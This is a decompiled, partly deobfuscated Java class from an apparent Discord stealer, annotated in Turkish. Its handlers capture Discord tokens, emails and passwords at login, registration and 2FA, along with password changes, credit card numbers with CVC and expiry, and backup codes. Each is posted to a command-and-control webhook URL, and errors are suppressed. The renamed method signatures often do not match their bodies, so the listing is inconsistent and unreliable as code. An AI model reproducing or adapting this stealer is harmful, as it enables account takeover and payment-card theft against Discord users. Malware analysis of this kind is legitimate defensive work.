/*\n * ========================================\n * DEOBFUSCATED: EventHandler.java\n * Original: d/n.java\n * ----------------------------------------\n * Discord olay işleyici - login/register/2FA/CC/backup code yakalama + webhook gönderme\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package d;

import a.Main;
import c.c$EmbedObject;
import d.c;
import d.k;
import d.l;
import d.p;
import d.r;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class n {
    private static final r runtimeState = new r();

    public static void handleEvent(String string, String string2) {
        new Thread(() -> n.lambda$handleLogin$0(string, string2)).start();
    }

    public static void sendToWebhook(String string, String string2) {
        new Thread(() -> n.lambda$handleRegister$0(string, string2)).start();
    }

    public static void handle2FALogin() {
        new Thread(n::lambda$handle2FALogin$0).start();
    }

    public static void handleAccountUpdate(Map<String, String> map) {
        new Thread(() -> n.lambda$handleAccountUpdate$0(map)).start();
    }

    public static void handleCreditCard(Map<String, String> map) {
        new Thread(() -> n.lambda$handleCreditCard$0(map)).start();
    }

    public static void handleBackupCodes(List<String> codes, String password) {
        new Thread(() -> n.lambda$handleBackupCodes$0(list, string)).start();
    }

    public static void performInitialInjection() {
        if (c.a()) {
            return;
        }
        if (a.f()) {
            return;
        }
        a.b(true);
        new Thread(n::lambda$performInitialInjection$0).start();
    }

    private static void sendTokenEmbed(Map<String, Object> profile, String eventType) {
        try {
            c$EmbedObject c$EmbedObject = null;
            List<c$EmbedObject> list = null;
            List<c$EmbedObject> list2 = null;
            switch (string) {
                case "injection": 
                case "login": 
                case "register": 
                case "2fa_login": {
                    c$EmbedObject = l.a(map);
                    list = l.c(map);
                    list2 = l.d(map);
                    break;
                }
                case "password_change": {
                    c$EmbedObject = l.f(map);
                    break;
                }
                case "credit_card": {
                    c$EmbedObject = l.g(map);
                    break;
                }
                case "backup_codes": {
                    c$EmbedObject = l.h(map);
                }
            }
            if (c$EmbedObject != null) {
                n.a(c$EmbedObject);
            }
            if (list != null) {
                for (c$EmbedObject c$EmbedObject2 : list) {
                    n.a(c$EmbedObject2);
                }
            }
            if (list2 != null) {
                for (c$EmbedObject c$EmbedObject3 : list2) {
                    n.a(c$EmbedObject3);
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void sendProfileEmbed(Map<String, Object> profile, String password) {
        try {
            c$EmbedObject c$EmbedObject = l.a(map, string);
            if (c$EmbedObject != null) {
                n.a(c$EmbedObject);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void postWebhookEmbed(c$EmbedObject embed) {
        try {
            if (c$EmbedObject == null) {
                return;
            }
            String string = Main.C2_URL + "/v1/webhook";
            String string2 = "{\"username\":" + n.a("Supreme") + ",\"avatar_url\":" + n.a("https://i.imgur.com/YYumsB0.png") + ",\"embeds\":[" + c$EmbedObject.toJson() + "]}";
            byte[] byArray = string2.getBytes(StandardCharsets.UTF_8);
            HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(string).openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            httpURLConnection.setRequestProperty("x-build-key", Main.LICENSE_KEY);
            httpURLConnection.setConnectTimeout(30000);
            httpURLConnection.setReadTimeout(30000);
            try (OutputStream outputStream = httpURLConnection.getOutputStream();){
                outputStream.write(byArray);
                outputStream.flush();
            }
            httpURLConnection.getResponseCode();
            httpURLConnection.disconnect();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static String nullSafe(String s) {
        if (string == null) {
            return "\"\"";
        }
        StringBuilder stringBuilder = new StringBuilder("\"");
        block6: for (char c2 : string.toCharArray()) {
            switch (c2) {
                case '\"': {
                    stringBuilder.append("\\\"");
                    continue block6;
                }
                case '\\': {
                    stringBuilder.append("\\\\");
                    continue block6;
                }
                case '\n': {
                    stringBuilder.append("\\n");
                    continue block6;
                }
                case '\r': {
                    stringBuilder.append("\\r");
                    continue block6;
                }
                default: {
                    stringBuilder.append(c2);
                }
            }
        }
        return stringBuilder.append("\"").toString();
    }

    private static String waitAndGrabToken() {
        try {
            return p.d();
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static String repeatChar(int count, int charCode) {
        for (int i2 = 0; i2 < n2; ++i2) {
            try {
                String string = n.c();
                if (string != null && string.length() > 20) {
                    return string;
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
            try {
                Thread.sleep(n3);
                continue;
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        return null;
    }

    private static void lambda$performInitialInjection$0() {
        try {
            Map<String, Object> map;
            Thread.sleep(3000L);
            String string = n.c();
            if (string != null && string.length() > 20 && !a.e() && (map = k.a(string, null, null)) != null) {
                n.a(map, "injection");
                c.b();
                a.a(true);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void lambda$handleBackupCodes$0(List list, String string) {
        try {
            if (list == null || list.isEmpty()) {
                return;
            }
            String string2 = n.c();
            if (string2 == null) {
                return;
            }
            Map<String, Object> map = k.a(string2, null, null);
            if (map != null) {
                map.put("backupCodes", list);
                map.put("bcPassword", string != null ? string : "");
                n.a(map, "backup_codes");
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void lambda$handleCreditCard$0(Map map) {
        try {
            String string = n.c();
            if (string == null) {
                return;
            }
            HashMap<String, Object> hashMap = new HashMap<String, Object>();
            HashMap<String, Object> hashMap2 = new HashMap<String, Object>();
            hashMap2.put("number", map.getOrDefault("card[number]", ""));
            hashMap2.put("cvc", map.getOrDefault("card[cvc]", ""));
            hashMap2.put("exp", map.getOrDefault("card[exp_month]", "") + "/" + map.getOrDefault("card[exp_year]", ""));
            hashMap.put("creditCard", hashMap2);
            Map<String, Object> map2 = k.a(string, null, hashMap);
            if (map2 != null) {
                n.a(map2, "credit_card");
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void lambda$handleAccountUpdate$0(Map map) {
        try {
            String string;
            Map<String, Object> map2;
            Thread.sleep(2200L);
            String string2 = n.a(10, 700);
            if (string2 == null) {
                return;
            }
            HashMap<String, Object> hashMap = new HashMap<String, Object>();
            String string3 = null;
            String string4 = null;
            if (map.containsKey("new_password")) {
                hashMap.put("newPassword", map.get("new_password"));
                string3 = "password_change";
            }
            if (map.containsKey("email")) {
                string4 = (String)map.get("email");
                string3 = "email_change";
            }
            if (string3 != null && (map2 = k.a(string2, string = (String)map.get("password"), hashMap)) != null) {
                if (map.containsKey("new_password")) {
                    map2.put("newPassword", map.get("new_password"));
                }
                if (string3.equals("email_change") && string4 != null) {
                    n.b(map2, string4);
                } else {
                    n.a(map2, string3);
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void lambda$handle2FALogin$0() {
        try {
            Map<String, Object> map;
            Thread.sleep(2200L);
            String string = n.a(12, 800);
            String string2 = a.c();
            if (string != null && (map = k.a(string, string2, null)) != null) {
                String string3;
                if (string2 != null && !string2.isEmpty()) {
                    map.put("password", string2);
                }
                if ((string3 = a.b()) != null && !string3.isEmpty()) {
                    map.put("email", string3);
                }
                n.a(map, "injection");
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void lambda$handleRegister$0(String string, String string2) {
        try {
            Map<String, Object> map;
            a.a(string, string2);
            Thread.sleep(2800L);
            String string3 = n.a(10, 700);
            if (string3 != null && (map = k.a(string3, string2, null)) != null) {
                if (string != null && !string.isEmpty()) {
                    map.put("email", string);
                }
                if (string2 != null && !string2.isEmpty()) {
                    map.put("password", string2);
                }
                n.a(map, "injection");
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void lambda$handleLogin$0(String string, String string2) {
        try {
            Map<String, Object> map;
            a.a(string, string2);
            Thread.sleep(2800L);
            String string3 = n.a(10, 700);
            if (string3 != null && (map = k.a(string3, string2, null)) != null) {
                if (string != null && !string.isEmpty()) {
                    map.put("email", string);
                }
                if (string2 != null && !string2.isEmpty()) {
                    map.put("password", string2);
                }
                n.a(map, "injection");
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }
}

